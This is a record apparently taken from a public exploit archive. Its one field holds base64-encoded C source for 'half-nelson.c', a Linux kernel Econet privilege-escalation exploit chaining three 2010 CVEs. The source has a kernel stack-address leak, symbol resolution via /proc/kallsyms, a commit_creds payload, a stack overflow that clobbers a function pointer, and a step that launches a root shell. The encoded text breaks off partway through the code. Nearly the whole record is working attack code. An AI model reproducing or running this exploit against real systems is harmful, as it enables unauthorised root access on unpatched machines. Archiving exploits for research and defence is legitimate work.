{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIGhhbGYtbmVsc29uLmMNCiAqDQogKiBMaW51eCBLZXJuZWwgPCAyLjYuMzYuMiBFY29uZXQgUHJpdmlsZWdlIEVzY2FsYXRpb24gRXhwbG9pdA0KICogSm9uIE9iZXJoZWlkZSA8am9uQG9iZXJoZWlkZS5vcmc+DQogKiBodHRwOi8vam9uLm9iZXJoZWlkZS5vcmcNCiAqIA0KICogSW5mb3JtYXRpb246DQogKg0KICogICBodHRwOi8vY3ZlLm1pdHJlLm9yZy9jZ2ktYmluL2N2ZW5hbWUuY2dpP25hbWU9Q1ZFLTIwMTAtMzg0OA0KICoNCiAqICAgU3RhY2stYmFzZWQgYnVmZmVyIG92ZXJmbG93IGluIHRoZSBlY29uZXRfc2VuZG1zZyBmdW5jdGlvbiBpbiANCiAqICAgbmV0L2Vjb25ldC9hZl9lY29uZXQuYyBpbiB0aGUgTGludXgga2VybmVsIGJlZm9yZSAyLjYuMzYuMiwgd2hlbiBhbiANCiAqICAgZWNvbmV0IGFkZHJlc3MgaXMgY29uZmlndXJlZCwgYWxsb3dzIGxvY2FsIHVzZXJzIHRvIGdhaW4gcHJpdmlsZWdlcyBieSANCiAqICAgcHJvdmlkaW5nIGEgbGFyZ2UgbnVtYmVyIG9mIGlvdmVjIHN0cnVjdHVyZXMuDQogKg0KICogICBodHRwOi8vY3ZlLm1pdHJlLm9yZy9jZ2ktYmluL2N2ZW5hbWUuY2dpP25hbWU9Q1ZFLTIwMTAtMzg1MA0KICoNCiAqICAgVGhlIGVjX2Rldl9pb2N0bCBmdW5jdGlvbiBpbiBuZXQvZWNvbmV0L2FmX2Vjb25ldC5jIGluIHRoZSBMaW51eCBrZXJuZWwgDQogKiAgIGJlZm9yZSAyLjYuMzYuMiBkb2VzIG5vdCByZXF1aXJlIHRoZSBDQVBfTkVUX0FETUlOIGNhcGFiaWxpdHksIHdoaWNoIA0KICogICBhbGxvd3MgbG9jYWwgdXNlcnMgdG8gYnlwYXNzIGludGVuZGVkIGFjY2VzcyByZXN0cmljdGlvbnMgYW5kIGNvbmZpZ3VyZSANCiAqICAgZWNvbmV0IGFkZHJlc3NlcyB2aWEgYW4gU0lPQ1NJRkFERFIgaW9jdGwgY2FsbC4NCiAqDQogKiAgIGh0dHA6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxMC00MDczDQogKg0KICogICBUaGUgaXBjIHN1YnN5c3RlbSBpbiB0aGUgTGludXgga2VybmVsIGJlZm9yZSAyLjYuMzctcmMxIGRvZXMgbm90IA0KICogICBpbml0aWFsaXplIGNlcnRhaW4gc3RydWN0dXJlcywgd2hpY2ggYWxsb3dzIGxvY2FsIHVzZXJzIHRvIG9idGFpbiANCiAqICAgcG90ZW50aWFsbHkgc2Vuc2l0aXZlIGluZm9ybWF0aW9uIGZyb20ga2VybmVsIHN0YWNrIG1lbW9yeS4NCiAqDQogKiBVc2FnZToNCiAqDQogKiAgICQgZ2NjIGhhbGYtbmVsc29uLmMgLW8gaGFsZi1uZWxzb24gLWxydA0KICogICAkIC4vaGFsZi1uZWxzb24NCiAqICAgWytdIGxvb2tpbmcgZm9yIHN5bWJvbHMuLi4NCiAqICAgWytdIHJlc29sdmVkIHN5bWJvbCBjb21taXRfY3JlZHMgdG8gMHhmZmZmZmZmZjgxMDg4YWQwDQogKiAgIFsrXSByZXNvbHZlZCBzeW1ib2wgcHJlcGFyZV9rZXJuZWxfY3JlZCB0byAweGZmZmZmZmZmODEwODhlYjANCiAqICAgWytdIHJlc29sdmVkIHN5bWJvbCBpYTMyX3N5c3JldCB0byAweGZmZmZmZmZmODEwNDY2OTINCiAqICAgWytdIHNwYXduaW5nIGNoaWxkcmVuIHRvIGFjaGlldmUgYWRqYWNlbnQga3N0YWNrcy4uLg0KICogICBbK10gZm91bmQgcGFyZW50IGtzdGFjayBhdCAweGZmZmY4ODAwMWM2Y2EwMDANCiAqICAgWytdIGZvdW5kIGFkamFjZW50IGNoaWxkcmVuIGtzdGFja3MgYXQgMHhmZmZmODgwMDBkMTBhMDAwIGFuZCAweGZmZmY4ODAwMGQxMGMwMDANCiAqICAgWytdIGxvd2VyIGNoaWxkIHNwYXduaW5nIGEgaGVscGVyLi4uDQogKiAgIFsrXSBsb3dlciBjaGlsZCBjYWxsaW5nIGNvbXBhdF9zeXNfd2FpdDQgb24gaGVscGVyLi4uDQogKiAgIFsrXSBoZWxwZXIgZ29pbmcgdG8gc2xlZXAuLi4NCiAqICAgWytdIHVwcGVyIGNoaWxkIHRyaWdnZXJpbmcgc3RhY2sgb3ZlcmZsb3cuLi4NCiAqICAgWytdIGhlbHBlciB3b2tlIHVwDQogKiAgIFsrXSBsb3dlciBjaGlsZCByZXR1cm5lZCBmcm9tIGNvbXBhdF9zeXNfd2FpdDQNCiAqICAgWytdIHBhcmVudCdzIHJlc3RhcnRfYmxvY2sgaGFzIGJlZW4gY2xvYmJlcmVkDQogKiAgIFsrXSBlc2NhbGF0aW5nIHByaXZpbGVnZXMuLi4NCiAqICAgWytdIGxhdW5jaGluZyByb290IHNoZWxsIQ0KICogICAjIGlkDQogKiAgIHVpZD0wKHJvb3QpIGdpZD0wKHJvb3QpDQogKg0KICogTm90ZXM6DQogKg0KICogICBUaGlzIGV4cGxvaXQgbGV2ZXJhZ2VzIHRocmVlIHZ1bG5lcmFiaWxpdGllcyB0byBlc2NhbGF0ZSBwcml2aWxlZ2VzLiANCiAqICAgVGhlIHByaW1hcnkgdnVsbmVyYWJpbGl0eSBpcyBhIGtlcm5lbCBzdGFjayBvdmVyZmxvdywgbm90IGEgc3RhY2sgYnVmZmVyIA0KICogICBvdmVyZmxvdyBhcyB0aGUgQ1ZFIGRlc2NyaXB0aW9uIGluY29ycmVjdGx5IHN0YXRlcy4gSSBiZWxpZXZlIHRoaXMgaXMgdGhlDQogKiAgIGZpcnN0IHB1YmxpYyBleHBsb2l0IGZvciBhIGtlcm5lbCBzdGFjayBvdmVyZmxvdywgYW5kIGl0IHR1cm5zIG91dCB0byBiZSANCiAqICAgYSBiaXQgdHJpY2t5IGR1ZSB0byBzb21lIHBhcnRpY3VsYXJzIG9mIHRoZSBlY29uZXQgdnVsbmVyYWJpbGl0eS4gQSBmdWxsIA0KICogICBicmVha2Rvd24gb2YgdGhlIGV4cGxvaXQgaXMgZm9ydGhjb21pbmcuDQogKg0KICogICBUZXN0ZWQgb24gVWJ1bnR1IDEwLjA0IExUUyAoMi42LjMyLTIxLWdlbmVyaWMpLg0KICovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHN0ZGRlZi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxsaW1pdHMuaD4NCiNpbmNsdWRlIDxzeXNjYWxsLmg+DQojaW5jbHVkZSA8aW50dHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCiNpbmNsdWRlIDxzeXMvaW9jdGwuaD4NCiNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KI2luY2x1ZGUgPHN5cy9pcGMuaD4NCiNpbmNsdWRlIDxzeXMvc2VtLmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KI2luY2x1ZGUgPHN5cy9yZXNvdXJjZS5oPg0KI2luY2x1ZGUgPHN5cy9zeXNjYWxsLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPg0KI2luY2x1ZGUgPG5ldC9pZi5oPg0KDQojZGVmaW5lIElPVlMgICAgICAgICAgIDQ0Ng0KI2RlZmluZSBOUFJPQyAgICAgICAgICAxMDI0DQojZGVmaW5lIEtTVEFDS19TSVpFICAgIDgxOTINCg0KI2RlZmluZSBLU1RBQ0tfVU5JTklUICAwDQojZGVmaW5lIEtTVEFDS19VUFBFUiAgIDENCiNkZWZpbmUgS1NUQUNLX0xPV0VSICAgMg0KI2RlZmluZSBLU1RBQ0tfRElFICAgICAzDQojZGVmaW5lIEtTVEFDS19QQVJFTlQgIDQNCiNkZWZpbmUgS1NUQUNLX0NMT0JCRVIgNQ0KDQojZGVmaW5lIExFQUtfQkFTRSAgICAgIDB4ZmZmZjg4MDAwMDAwMDAwMA0KI2RlZmluZSBMRUFLX1RPUCAgICAgICAweGZmZmY4ODAwYzAwMDAwMDANCiNkZWZpbmUgTEVBS19ERVBUSCAgICAgNTAwDQojZGVmaW5lIExFQUtfT0ZGU0VUICAgIDMyIA0KDQojZGVmaW5lIE5SX0lQQyAgICAgICAgIDB4NzUNCiNkZWZpbmUgTlJfV0FJVDQgICAgICAgMHg3Mg0KI2RlZmluZSBTRU1DVEwgICAgICAgICAweDMNCg0KI2lmbmRlZiBQRl9FQ09ORVQNCiNkZWZpbmUgUEZfRUNPTkVUICAgICAgMTkNCiNlbmRpZg0KDQojZGVmaW5lIFNUQUNLX09GRlNFVCAgIDYNCiNkZWZpbmUgUkVTVEFSVF9PRkZTRVQgNDANCg0Kc3RydWN0IGVjX2FkZHIgew0KCXVuc2lnbmVkIGNoYXIgc3RhdGlvbjsNCgl1bnNpZ25lZCBjaGFyIG5ldDsNCn07DQoNCnN0cnVjdCBzb2NrYWRkcl9lYyB7DQoJdW5zaWduZWQgc2hvcnQgc2VjX2ZhbWlseTsNCgl1bnNpZ25lZCBjaGFyIHBvcnQ7DQoJdW5zaWduZWQgY2hhciBjYjsNCgl1bnNpZ25lZCBjaGFyIHR5cGU7DQoJc3RydWN0IGVjX2FkZHIgYWRkcjsNCgl1bnNpZ25lZCBsb25nIGNvb2tpZTsNCn07DQoNCnN0cnVjdCBpcGM2NF9wZXJtIHsNCgl1aW50MzJfdCBrZXk7DQoJdWludDMyX3QgdWlkOw0KCXVpbnQzMl90IGdpZDsNCgl1aW50MzJfdCBjdWlkOw0KCXVpbnQzMl90IGNnaWQ7DQoJdWludDMyX3QgbW9kZTsNCgl1aW50MTZfdCBzZXE7DQoJdWludDE2X3QgX19wYWQyOw0KCXVuc2lnbmVkIGxvbmcgX191bnVzZWQxOw0KCXVuc2lnbmVkIGxvbmcgX191bnVzZWQyOw0KfTsNCg0Kc3RydWN0IHNlbWlkNjRfZHMgew0KCXN0cnVjdCBpcGM2NF9wZXJtIHNlbV9wZXJtOw0KCXVuc2lnbmVkIGxvbmcgc2VtX290aW1lOw0KCXVuc2lnbmVkIGxvbmcgX191bnVzZWQxOw0KCXVuc2lnbmVkIGxvbmcgc2VtX2N0aW1lOw0KCXVuc2lnbmVkIGxvbmcgX191bnVzZWQ7DQoJdW5zaWduZWQgbG9uZyBzZW1fbnNlbXM7DQoJdW5zaWduZWQgbG9uZyBfX3VudXNlZDM7DQoJdW5zaWduZWQgbG9uZyBfX3VudXNlZDQ7DQp9Ow0KDQp1bmlvbiBzZW11biB7DQoJaW50IHZhbDsNCglzdHJ1Y3Qgc2VtaWRfZHMgKmJ1ZjsNCgl1bnNpZ25lZCBzaG9ydCAqYXJyYXk7DQoJc3RydWN0IHNlbWluZm8gKl9fYnVmOw0KfTsNCg0Kc3RydWN0IHJlZ2lvbiB7DQoJdW5zaWduZWQgbG9uZyBwYXJlbnQ7DQoJdW5zaWduZWQgbG9uZyBhZGRyc1tOUFJPQ107DQp9Ow0Kc3RydWN0IHJlZ2lvbiAqcmVnaW9uOw0KDQp0eXBlZGVmIGludCBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkgKCogX2NvbW1pdF9jcmVkcykodW5zaWduZWQgbG9uZyBjcmVkKTsNCnR5cGVkZWYgdW5zaWduZWQgbG9uZyBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkgKCogX3ByZXBhcmVfa2VybmVsX2NyZWQpKHVuc2lnbmVkIGxvbmcgY3JlZCk7DQpfY29tbWl0X2NyZWRzIGNvbW1pdF9jcmVkczsNCl9wcmVwYXJlX2tlcm5lbF9jcmVkIHByZXBhcmVfa2VybmVsX2NyZWQ7DQp1bnNpZ25lZCBsb25nIGlhMzJfc3lzcmV0Ow0KIA0Kdm9pZCBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkNCmtlcm5lbF9jb2RlKHZvaWQpDQp7DQoJY29tbWl0X2NyZWRzKHByZXBhcmVfa2VybmVsX2NyZWQoMCkpOw0KfQ0KDQp2b2lkDQpwYXlsb2FkX3BhcmVudCh2b2lkKQ0Kew0KCWFzbSB2b2xhdGlsZSAoDQoJCSJtb3YgJGtlcm5lbF9jb2RlLCAlcmF4XG4iDQoJCSJjYWxsIColcmF4XG4iDQoJKTsNCn0NCg0Kdm9pZA0KcGF5bG9hZF9jaGlsZCh2b2lkKQ0Kew0KCWFzbSB2b2xhdGlsZSAoDQoJCSJtb3ZxICRwYXlsb2FkX3BhcmVudCwgKCUwKVxuIg0KCQkiam1wcSAqJTFcbiINCgkJOg0KCQk6ICJyIihyZWdpb24tPnBhcmVudCArIFJFU1RBUlRfT0ZGU0VUKSwgInIiKGlhMzJfc3lzcmV0KQ0KCSk7DQp9DQoNCnVuc2lnbmVkIGxvbmcNCmdldF9rc3RhY2sodm9pZCkNCnsNCglpbnQgaSwgc2l6ZSwgb2Zmc2V0Ow0KCXVuaW9uIHNlbXVuICphcmc7DQoJc3RydWN0IHNlbWlkX2RzIGR1bW15Ow0KCXN0cnVjdCBzZW1pZDY0X2RzICpsZWFrZWQ7DQoJY2hhciAqc3RhY2tfc3RhcnQsICpzdGFja19lbmQ7DQoJdW5zaWduZWQgY2hhciAqcDsNCgl1bnNpZ25lZCBsb25nIGtzdGFjaywgKnB0cjsNCg0KCS8qIG1ha2Ugc3VyZSBvdXIgYXJndW1lbnQgaXMgMzItYml0IGFjY2Vzc2libGUgKi8NCglhcmcgPSBtbWFwKE5VTEwsIDQwOTYsIFBST1RfUkVBRCB8IFBST1RfV1JJVEUsIE1BUF9BTk9OWU1PVVMgfCBNQVBfUFJJVkFURSB8IE1BUF8zMkJJVCwgLTEsIDApOw0KCWlmIChhcmcgPT0gTUFQX0ZBSUxFRCkgew0KCQlwcmludGYoIlstXSBmYWlsdXJlIG1hcHBpbmcgbWVtb3J5LCBhYm9ydGluZyFcbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCS8qIG1hcCBhIGZha2Ugc3RhY2sgdG8gdXNlIGR1cmluZyBzeXNjYWxsICovDQoJc3RhY2tfc3RhcnQgPSBtbWFwKE5VTEwsIDQwOTYsIFBST1RfUkVBRCB8IFBST1RfV1JJVEUsIE1BUF9BTk9OWU1PVVMgfCBNQVBfUFJJVkFURSB8IE1BUF8zMkJJVCwgLTEsIDApOw0KCWlmIChzdGFja19zdGFydCA9PSBNQVBfRkFJTEVEKSB7DQoJCXByaW50ZigiWy1dIGZhaWx1cmUgbWFwcGluZyBtZW1vcnksIGFib3J0aW5nIVxuIik7DQoJCWV4aXQoMSk7DQoJfQ0KCXN0YWNrX2VuZCA9IHN0YWNrX3N0YXJ0ICsgNDA5NjsNCg0KCW1lbXNldChhcmcsIDAsIHNpemVvZih1bmlvbiBzZW11bikpOw0KCW1lbXNldCgmZHVtbXksIDAsIHNpemVvZihzdHJ1Y3Qgc2VtaWRfZHMpKTsNCglhcmctPmJ1ZiA9ICZkdW1teTsNCg0KCS8qIHN5c2NhbGwoTlJfSVBDLCBTRU1DVEwsIDAsIDAsIElQQ19TRVQsIGFyZykgKi8NCglhc20gdm9sYXRpbGUgKA0KCQkicHVzaCAlJXJheFxuIg0KCQkicHVzaCAlJXJieFxuIg0KCQkicHVzaCAlJXJjeFxuIg0KCQkicHVzaCAlJXJkeFxuIg0KCQkicHVzaCAlJXJzaVxuIg0KCQkicHVzaCAlJXJkaVxuIg0KCQkibW92bCAlMCwgJSVlYXhcbiINCgkJIm1vdmwgJTEsICUlZWJ4XG4iDQoJCSJtb3ZsICUyLCAlJWVjeFxuIg0KCQkibW92bCAlMywgJSVlZHhcbiINCgkJIm1vdmwgJTQsICUlZXNpXG4iDQoJCSJtb3ZxICU1LCAlJXJkaVxuIg0KCQkibW92cSAlJXJzcCwgJSVyOFxuIg0KCQkibW92cSAlNiwgJSVyc3BcbiINCgkJInB1c2ggJSVyOFxuIg0KCQkiaW50ICQweDgwXG4iDQoJCSJwb3AgJSVyOFxuIg0KCQkibW92cSAlJXI4LCAlJXJzcFxuIg0KCQkicG9wICUlcmRpXG4iDQoJCSJwb3AgJSVyc2lcbiINCgkJInBvcCAlJXJkeFxuIg0KCQkicG9wICUlcmN4XG4iDQoJCSJwb3AgJSVyYnhcbiINCgkJInBvcCAlJXJheFxuIg0KCQk6DQoJCTogInIiKE5SX0lQQyksICJyIihTRU1DVEwpLCAiciIoMCksICJyIigwKSwgInIiKElQQ19TRVQpLCAiciIoYXJnKSwgInIiKHN0YWNrX2VuZCkNCgkJOiAibWVtb3J5IiwgInJheCIsICJyYngiLCAicmN4IiwgInJkeCIsICJyc2kiLCAicmRpIiwgInI4Ig0KCSk7DQoNCgkvKiBuYWl2ZWx5IGV4dHJhY3QgYSBwb2ludGVyIHRvIHRoZSBrc3RhY2sgZnJvbSB0aGUga3N0YWNrICovDQoJcCA9IHN0YWNrX2VuZCAtIChzaXplb2YodW5zaWduZWQgbG9uZykgKyBzaXplb2Yoc3RydWN0IHNlbWlkNjRfZHMpKSArIExFQUtfT0ZGU0VUOw0KCWtzdGFjayA9ICoodW5zaWduZWQgbG9uZyAqKSBwOw0KDQoJaWYgKGtzdGFjayA8IExFQUtfQkFTRSB8fCBrc3RhY2sgPiBMRUFLX1RPUCkgew0KCQlwcmludGYoIlstXSBmYWlsZWQgdG8gbGVhayBhIHN1aXRhYmxlIGtzdGFjayBhZGRyZXNzLCB0cnkgYWdhaW4hXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoJaWYgKChrc3RhY2sgJSAweDEwMDApIDwgKDB4MTAwMCAtIExFQUtfREVQVEgpKSB7DQoJCXByaW50ZigiWy1dIGZhaWxlZCB0byBsZWFrIGEgc3VpdGFibGUga3N0YWNrIGFkZHJlc3MsIHRyeSBhZ2FpbiFcbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCWtzdGFjayA9IGtzdGFjayAmIH4weDFmZmY7DQoJDQoJcmV0dXJuIGtzdGFjazsNCn0NCg0KdW5zaWduZWQgbG9uZw0KZ2V0X3N5bWJvbChjaGFyICpuYW1lKQ0Kew0KCUZJTEUgKmY7DQoJdW5zaWduZWQgbG9uZyBhZGRyOw0KCWNoYXIgZHVtbXksIHN5bVs1MTJdOw0KCWludCByZXQgPSAwOw0KIA0KCWYgPSBmb3BlbigiL3Byb2Mva2FsbHN5bXMiLCAiciIpOw0KCWlmICghZikgew0KCQlyZXR1cm4gMDsNCgl9DQogDQoJd2hpbGUgKHJldCAhPSBFT0YpIHsNCgkJcmV0ID0gZnNjYW5mKGYsICIlcCAlYyAlc1xuIiwgKHZvaWQgKiopICZhZGRyLCAmZHVtbXksIHN5bSk7DQoJCWlmIChyZXQgPT0gMCkgew0KCQkJZnNjYW5mKGYsICIlc1xuIiwgc3ltKTsNCgkJCWNvbnRpbnVlOw0KCQl9DQoJCWlmICghc3RyY21wKG5hbWUsIHN5bSkpIHsNCgkJCXByaW50ZigiWytdIHJlc29sdmVkIHN5bWJvbCAlcyB0byAlcFxuIiwgbmFtZSwgKHZvaWQgKikgYWRkcik7DQoJCQlmY2xvc2UoZik7DQoJCQlyZXR1cm4gYWRkcjsNCgkJfQ0KCX0NCglmY2xvc2UoZik7DQogDQoJcmV0dXJuIDA7DQp9DQoNCmludA0KZ2V0X2FkamFjZW50X2tzdGFja3Modm9pZCkNCnsNCglpbnQgaSwgcmV0LCBzaG0sIHBpZCwgdHlwZTsNCg0KCS8qIGNyZWF0ZSBzaGFyZWQgY29tbXVuaWNhdGlvbiBjaGFubmVsIGJldHdlZW4gcGFyZW50IGFuZCBpdHMgY2hpbGRyZW4gKi8NCglzaG0gPSBzaG1fb3BlbigiL2hhbGZuZWxzb24iLCBPX1JEV1IgfCBPX0NSRUFULCBTX0lSV1hVIHwgU19JUldYRyB8IFNfSVJXWE8pOw0KCWlmIChzaG0gPCAwKSB7DQoJCXByaW50ZigiWy1dIGZhaWxlZCBjcmVhdGluZyBzaGFyZWQgbWVtb3J5LCBhYm9ydGluZyFcbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCXJldCA9IGZ0cnVuY2F0ZShzaG0sIHNpemVvZihzdHJ1Y3QgcmVnaW9uKSk7DQoJaWYgKHJldCAhPSAwKSB7DQoJCXByaW50ZigiWy1dIGZhaWxlZCByZXNpemluZyBzaGFyZWQgbWVtb3J5LCBhYm9ydGluZyFcbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCXJlZ2lvbiA9IG1tYXAoTlVMTCwgc2l6ZW9mKHN0cnVjdCByZWdpb24pLCBQUk9UX1JFQUQgfCBQUk9UX1dSSVRFLCBNQVBfU0hBUkVELCBzaG0sIDApOw0KCW1lbXNldChyZWdpb24sIEtTVEFDS19VTklOSVQsIHNpemVvZihzdHJ1Y3QgcmVnaW9uKSk7DQoNCgkvKiBwYXJlbnQga3N0YWNrIHNlbGYtZGlzY292ZXJ5ICovDQoJcmVnaW9uLT5wYXJlbnQgPSBnZXRfa3N0YWNrKCk7DQoNCglwcmludGYoIlsrXSBmb3VuZCBwYXJlbnQga3N0YWNrIGF0IDB4JWx4XG4iLCByZWdpb24tPnBhcmVudCk7DQoNCgkvKiBmb3JrIGFuZCBkaXNjb3ZlciBjaGlsZHJlbiB3aXRoIGFkamFjZW50bHktYWxsb2NhdGVkIGtlcm5lbCBzdGFja3MgKi8NCglmb3IgKGkgPSAwOyBpIDwgTlBST0M7ICsraSkgew0KCQlwaWQgPSBmb3JrKCk7DQoNCgkJaWYgKHBpZCA+IDApIHsNCgkJCXR5cGUgPSBLU1RBQ0tfUEFSRU5UOw0KCQkJY29udGludWU7DQoJCX0gZWxzZSBpZiAocGlkID09IDApIHsNCgkJCS8qIGNoaWxkcmVuIGRvIGtzdGFjayBzZWxmLWRpc2NvdmVyeSAqLw0KCQkJcmVnaW9uLT5hZGRyc1tpXSA9IGdldF9rc3RhY2soKTsNCg0KCQkJLyogY2hpbGRyZW4gc2xlZXAgdW50aWwgcGFyZW50IGhhcyBmb3VuZCBhZGphY2VudCBjaGlsZHJlbiAqLw0KCQkJd2hpbGUgKDEpIHsNCgkJCQlzbGVlcCgxKTsNCgkJCQlpZiAocmVnaW9uLT5hZGRyc1tpXSA9PSBLU1RBQ0tfRElFKSB7DQoJCQkJCS8qIHBhcmVudCBkb2Vzbid0IG5lZWQgdXMgOi0oICovDQoJCQkJCWV4aXQoMCk7DQoJCQkJfSBlbHNlIGlmIChyZWdpb24tPmFkZHJzW2ldID09IEtTVEFDS19VUFBFUikgew0KCQkJCQkvKiB3ZSdyZSB0aGUgdXBwZXIgYWRqYWNlbnQgcHJvY2VzcyAqLw0KCQkJCQl0eXBlID0gS1NUQUNLX1VQUEVSOw0KCQkJCQlicmVhazsNCgkJCQl9IGVsc2UgaWYgKHJlZ2lvbi0+YWRkcnNbaV0gPT0gS1NUQUNLX0xPV0VSKSB7DQoJCQkJCS8qIHdlJ3JlIHRoZSBsb3dlciBhZGphY2VudCBwcm9jZXNzICovDQoJCQkJCXR5cGUgPSBLU1RBQ0tfTE9XRVI7DQoJCQkJCWJyZWFrOw0KCQkJCX0NCgkJCX0NCgkJCWJyZWFrOw0KCQl9IGVsc2Ugew0KCQkJcHJpbnRmKCJbLV0gZm9yayBmYWlsZWQsIGFib3J0aW5nIVxuIik7DQoJCQlleGl0KDEpOw0KCQl9DQoJfQ0KDQoJcmV0dXJuIHR5cGU7DQp9DQoNCnZvaWQNCmRvX3BhcmVudCh2b2lkKQ0Kew0KCWludCBpLCBqLCB1cHBlciwgbG93ZXI7DQoNCgkvKiBwYXJlbnQgc2xlZXBzIHVudGlsIHdlJ3ZlIGRpc2NvdmVyZWQgYWxsIHRoZSBjaGlsZCBrc3RhY2tzICovDQoJd2hpbGUgKDEpIHsNCgkJc2xlZXAoMSk7DQoJCWZvciAoaSA9IDA7IGkgPCBOUFJPQzsgKytpKSB7DQoJCQlpZiAocmVnaW9uLT5hZGRyc1tpXSA9PSBLU1RBQ0tfVU5JTklUKSB7DQoJCQkJYnJlYWs7DQoJCQl9DQoJCX0NCgkJaWYgKGkgPT0gTlBST0MpIHsNCgkJCWJyZWFrOw0KCQl9DQoJfQ0KDQoJLyogZmlndXJlIG91dCBpZiB3ZSBoYXZlIGFueSBhZGphY2VudCBjaGlsZCBrc3RhY2tzICovDQoJZm9yIChpID0gMDsgaSA8IE5QUk9DOyArK2kpIHsNCgkJZm9yIChqID0gMDsgaiA8IE5QUk9DOyArK2opIHsNCgkJCWlmIChyZWdpb24tPmFkZHJzW2ldID09IHJlZ2lvbi0+YWRkcnNbal0gKyBLU1RBQ0tfU0laRSkgew0KCQkJCWJyZWFrOw0KCQkJfQ0KCQl9DQoJCWlmIChqICE9IE5QUk9DKSB7DQoJCQlicmVhazsNCgkJfQ0KCX0NCglpZiAoaSA9PSBOUFJPQyAmJiBqID09IE5QUk9DKSB7DQoJCXByaW50ZigiWy1dIGZhaWxlZCB0byBmaW5kIGFkamFjZW50IGtzdGFja3MsIHRyeSBhZ2FpbiFcbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCXVwcGVyID0gaTsNCglsb3dlciA9IGo7DQoNCglwcmludGYoIlsrXSBmb3VuZCBhZGphY2VudCBjaGlsZHJlbiBrc3RhY2tzIGF0IDB4JWx4IGFuZCAweCVseFxuIiwgcmVnaW9uLT5hZGRyc1tsb3dlcl0sIHJlZ2lvbi0+YWRkcnNbdXBwZXJdKTsNCg0KCS8qIHNpZ25hbCB0byBub24tYWRqYWNlbnQgY2hpbGRyZW4gdG8gZGllICovDQoJZm9yIChpID0gMDsgaSA8IE5QUk9DOyArK2kpIHsNCgkJaWYgKGkgIT0gdXBwZXIgJiYgaSAhPSBsb3dlcikgew0KCQkJcmVnaW9uLT5hZGRyc1tpXSA9IEtTVEFDS19ESUU7DQoJCX0NCgl9DQoNCgkvKiBzaWduYWwgYWRqYWNlbnQgY2hpbGRyZW4gdG8gY29udGludWUgb24gKi8NCglyZWdpb24tPmFkZHJzW3VwcGVyXSA9IEtTVEFDS19VUFBFUjsNCglyZWdpb24tPmFkZHJzW2xvd2VyXSA9IEtTVEFDS19MT1dFUjsNCg0KCS8qIHBhcmVudCBzbGVlcHMgdW50aWwgY2hpbGQgaGFzIGNsb2JiZXJlZCB0aGUgZnB0ciAqLw0KCXdoaWxlICgxKSB7DQoJCXNsZWVwKDEpOw0KCQlpZiAocmVnaW9uLT5wYXJlbnQgPT0gS1NUQUNLX0NMT0JCRVIpIHsNCgkJCWJyZWFrOw0KCQl9DQoJfQ0KDQoJcHJpbnRmKCJbK10gZXNjYWxhdGluZyBwcml2aWxlZ2VzLi4uXG4iKTsNCg0KCS8qIHRyaWdnZXIgb3VyIGNsb2JiZXJlZCBmcHRyICovDQoJc3lzY2FsbChfX05SX3Jlc3RhcnRfc3lzY2FsbCk7DQoNCgkvKiBvdXIgcHJpdmlsZWdlcyBzaG91bGQgYmUgZXNjYWxhdGVkIG5vdyAqLw0KCWlmIChnZXR1aWQoKSAhPSAwKSB7DQoJCXByaW50ZigiWy1dIHByaXZpbGVnZSBlc2NhbGF0aW9uIGZhaWxlZCwgYWJvcnRpbmchXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglwcmludGYoIlsrXSBsYXVuY2hpbmcgcm9vdCBzaGVsbCFcbiIpOw0KDQoJZXhlY2woIi9iaW4vc2giLCAiL2Jpbi9zaCIsIE5VTEwpOw0KfQ0KDQp2b2lkDQpkb19jaGlsZF91cHBlcih2b2lkKQ0Kew0KCWludCBpLCByZXQsIGVjb19zb2NrOw0KCXN0cnVjdCBzb2NrYWRkcl9lYyBlY29fYWRkcjsNCglzdHJ1Y3QgbXNnaGRyIGVjb19tc2c7DQoJc3RydWN0IGlvdmVjIGlvdnNbSU9WU107DQoJc3RydWN0IGlmcmVxIGlmcjsNCgljaGFyICp0YXJnZXQ7DQoNCgkvKiBjYWxjdWxhdGUgcGF5bG9hZCB0YXJnZXQsIHNraXAgcHJvbG9ndWUgKi8NCgl0YXJnZXQgPSAoY2hhciAqKSBwYXlsb2FkX2NoaWxkOw0KCXRhcmdldCArPSA0Ow0KCQ0KCS8qIGdpdmUgbG93ZXIgY2hpbGQgYSBjaGFuY2UgdG8gZW50ZXIgaXRzIHdhaXQ0IGNhbGwgKi8NCglzbGVlcCgxKTsNCg0KCS8qIHdyaXRlIHNvbWUgemVyb3MgKi8NCglmb3IgKGkgPSAwOyBpIDwgU1RBQ0tfT0ZGU0VUOyArK2kpIHsNCgkJaW92c1tpXS5pb3ZfYmFzZSA9ICh2b2lkICopIDB4MDsNCgkJaW92c1tpXS5pb3ZfbGVuID0gMDsNCgl9DQoNCgkvKiBvdmVyd3JpdGUgc2F2ZWQgaWEzMl9zeXNyZXQgYWRkcmVzcyBvbiBzdGFjayAqLw0KCWlvdnNbU1RBQ0tfT0ZGU0VUXS5pb3ZfYmFzZSA9ICh2b2lkICopIHRhcmdldDsNCglpb3ZzW1NUQUNLX09GRlNFVF0uaW92X